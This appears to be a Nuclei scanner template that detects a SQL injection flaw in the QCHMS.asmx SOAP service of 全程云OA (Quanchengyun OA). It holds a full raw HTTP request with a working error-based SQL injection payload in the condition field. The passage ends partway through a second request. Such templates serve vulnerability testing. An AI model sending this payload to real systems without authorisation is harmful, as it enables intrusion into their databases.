id: Full-process-Cloud-OA-QCHMS-sqli
info:
  name: Full-process-Cloud-OA-QCHMS-sqli
  author: lemonlove7
  severity: high
  description: 全程云OA QCHMS.asmx 存在SQL注入
http:
  - raw:
      - |-
        POST /OA/HMS/QCHMS.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: 636
        SOAPAction: "http://tempuri.org/GetProjectResumeList"
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate
        Cookie: td_cookie=2806975495
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://{{Hostname}}/OA/HMS/QCHMS.asmx
        Accept-Language: zh-CN,zh;q=0.9
        Upgrade-Insecure-Requests: 1
        
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
         <soap:Body>
          <GetProjectResumeList xmlns="http://tempuri.org/">
           <pageIndex>1</pageIndex>
           <pageSize>20</pageSize>
           <condition> AND 1078 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (SUBSTRING(@@version,1,1)=CHAR(77)) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(107)+CHAR(113)))</condition>
          </GetProjectResumeList>
         </soap:Body>
        </soap:Envelope>
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - qvkvq1qqqkq
    matchers-condition: and

  - raw:
      - |-
        POST /HMS/QCHMS.asmx HTTP/1.1
        Host: {{Hostname}}
